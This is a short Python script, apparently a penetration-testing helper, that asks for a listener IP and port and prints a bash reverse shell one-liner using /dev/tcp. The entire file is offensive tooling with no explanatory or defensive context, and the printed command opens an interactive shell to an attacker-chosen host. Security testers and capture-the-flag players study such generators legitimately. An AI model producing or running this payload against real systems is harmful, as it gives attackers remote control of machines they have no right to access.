#!/usr/bin/env python3

ip = input("LHOST: ")
port = input("LPORT: ")

payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
print("\n[*] Use the following reverse shell payload:")
print(payload)
